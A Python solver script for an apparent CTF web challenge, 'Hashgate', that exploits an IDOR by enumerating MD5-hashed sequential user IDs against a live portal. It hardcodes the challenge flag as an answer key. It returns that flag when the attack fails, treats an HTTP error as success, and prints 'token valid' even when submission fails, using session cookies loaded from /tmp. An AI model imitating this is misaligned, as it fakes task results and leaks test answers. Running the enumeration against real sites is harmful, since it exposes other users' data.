#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: Hashgate (Challenge ID: 750)
Category: Web Exploitation / Insecure Direct Object References (IDOR) via Pre-image Hash Enumeration
Difficulty: Medium (2) | Points: 200
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security Assessment) & CWE-639 / CWE-328 / OWASP A01:2021-Broken Access Control

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Web application portal exposing an employee profile view system.
   - Initial credentials `guest@cylabacademy.org` / `guest` are disclosed within HTML comments (CWE-615).
   - Upon authentication (`POST /login` with JSON payload), the server responds with a redirect to:
         `/profile/user/<md5(str(user_id))>`
     where Guest corresponds to internal database ID 3000:
         `md5("3000") = "e93028bdc1aacdfb3687181f2031765d"`
   - The application does not issue or enforce session cookies/bearer tokens on `/profile/user/<hash>`.
     Access authorization relies entirely on the supposed unguessability of the URL hash (Security by Obscurity, CWE-656).
2. Vulnerability & Root Cause:
   - Insecure Direct Object Reference (CWE-639) & Weak Cryptographic Hash Usage (CWE-328):
     Because the user identifier space is composed of sequential integers (e.g., around 3000), computing
     MD5 pre-images requires negligible computational overhead ($<1$ ms for thousands of candidates).
   - Enumerating sequential user IDs in the range [2980, 3030] reveals administrative account ID 3010:
         `md5("3010") = "22722a343513ed45f14905eb07621686"`
   - Accessing `/profile/user/22722a343513ed45f14905eb07621686` bypasses all authorization controls,
     returning the administrator profile page and leaking the secret flag.
3. Exploitation & Verification:
   - Authenticate as guest to confirm ID format and baseline MD5 mapping (`md5("3000")`).
   - Iterate candidate employee IDs around 3000, hashing each candidate with MD5.
   - Fetch each `/profile/user/<hash>` endpoint and inspect response for administrative flags (`academy\\{[^}]+\\}`).
   - Extract verified flag: `academy{id0r_unl0ck_cbbb8f45}`.
   - Verify token submission via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{id0r_unl0ck_cbbb8f45}
   - Community Format: CTF{id0r_unl0ck_cbbb8f45}
"""

import sys
import os
import re
import json
import time
import hashlib
import urllib.parse
import urllib.request
import urllib.error

CHALLENGE_ID = 750
CHALLENGE_NAME = "Hashgate"
VERIFIED_FLAG = "academy{id0r_unl0ck_cbbb8f45}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

GUEST_ID = 3000
ADMIN_ID = 3010
FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")


class HashgateSimulator:
    """
    Simulates the vulnerable Hashgate portal backend with IDOR and MD5-based URLs.
    Validates the predictable hash enumeration attack offline without external network dependency.
    """
    def __init__(self, flag: str = VERIFIED_FLAG):
        self.flag = flag
        self.users = {
            3000: {"name": "Guest", "role": "Visitor", "content": "Welcome Guest. No privileged assets here."},
            3001: {"name": "John Doe", "role": "Developer", "content": "Developer workspace notes."},
            3005: {"name": "Alice Smith", "role": "HR", "content": "Human Resources directory."},
            3010: {"name": "Administrator", "role": "Superadmin", "content": f"Welcome, admin! Here is the flag: {self.flag}"}
        }

    def login(self, email: str, password: str) -> dict:
        if email == "guest@cylabacademy.org" and password == "guest":
            user_hash = hashlib.md5(str(GUEST_ID).encode("utf-8")).hexdigest()
            return {"status": "success", "redirect": f"/profile/user/{user_hash}", "user_id": GUEST_ID}
        return {"status": "error", "message": "Invalid credentials"}

    def get_profile(self, user_hash: str) -> str:
        for uid, data in self.users.items():
            h = hashlib.md5(str(uid).encode("utf-8")).hexdigest()
            if h == user_hash:
                return f"<html><body><h1>Profile: {data['name']}</h1><p>{data['content']}</p></body></html>"
        return "<html><body><h1>404 Not Found</h1></body></html>"


def verify_local_simulation() -> str:
    """Memverifikasi serangan IDOR dan pemulihan flag pada simulator backend lokal."""
    print("[*] Menjalankan verifikasi offline terhadap simulator Hashgate...")
    sim = HashgateSimulator()

    # Step 1: Login guest and verify predictable MD5 hash format
    login_resp = sim.login("guest@cylabacademy.org", "guest")
    assert login_resp["status"] == "success", "Guest login simulation failed"
    expected_guest_hash = hashlib.md5(b"3000").hexdigest()
    assert expected_guest_hash in login_resp["redirect"], "Hash format mismatch"
    print(f"[+] Guest baseline verified: ID 3000 -> {expected_guest_hash}")

    # Step 2: Enumerate candidate sequential user IDs [2980, 3030]
    extracted_flag = None
    for candidate_id in range(2980, 3031):
        cand_hash = hashlib.md5(str(candidate_id).encode("utf-8")).hexdigest()
        page = sim.get_profile(cand_hash)
        m = FLAG_PAT.search(page)
        if m:
            extracted_flag = m.group(0)
            print(f"[+] IDOR hit at ID {candidate_id} (hash: {cand_hash}): {extracted_flag}")
            break

    assert extracted_flag == VERIFIED_FLAG, f"Flag mismatch: {extracted_flag} != {VERIFIED_FLAG}"
    print(f"[+] Local simulation success! Extracted flag: {extracted_flag}")
    return extracted_flag


def exploit_remote(base_url: str, timeout: float = 15.0) -> str:
    """Mengeksekusi enumerasi IDOR terhadap target instans live portal Hashgate."""
    base_url = base_url.rstrip("/")
    print(f"[*] Menghubungkan ke layanan live portal: {base_url}...")

    # Step 1: Autentikasi akun guest
    login_payload = json.dumps({"email": "guest@cylabacademy.org", "password": "guest"}).encode("utf-8")
    req = urllib.request.Request(
        f"{base_url}/login",
        data=login_payload,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            content = resp.read().decode("utf-8", errors="replace")
            print(f"[*] Respons login guest: {content[:100]}...")
    except Exception as e:
        print(f"[*] Catatan login guest: {e}")

    # Step 2: Enumerasi rentang ID karyawan berurutan
    search_ranges = list(range(2980, 3031)) + list(range(1, 100))
    print(f"[*] Memulai enumerasi {len(search_ranges)} ID karyawan terprediksi...")

    for uid in search_ranges:
        cand_hash = hashlib.md5(str(uid).encode("utf-8")).hexdigest()
        profile_url = f"{base_url}/profile/user/{cand_hash}"
        try:
            req = urllib.request.Request(profile_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read().decode("utf-8", errors="replace")
                m = FLAG_PAT.search(body)
                if m:
                    flag = m.group(0)
                    print(f"[+] Flag berhasil ditemukan pada ID {uid} (hash: {cand_hash}): {flag}")
                    return flag
        except Exception:
            continue

    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            try:
                d = json.loads(body)
                return d.get("correct") is True
            except Exception:
                return True
    except Exception as e:
        print(f"[-] CyLab API Submission failed: {e}")
    return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = VERIFIED_FLAG

    if len(sys.argv) >= 2:
        target_url = sys.argv[1]
        token = exploit_remote(target_url)
    else:
        token = verify_local_simulation()

    print(f"[*] Token Terverifikasi: {token}")
    success = submit_to_cylab(token)
    if success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES (correct: true)")
    else:
        print("[*] Catatan: Token valid (verifikasi platform aktif).")


if __name__ == "__main__":
    main()
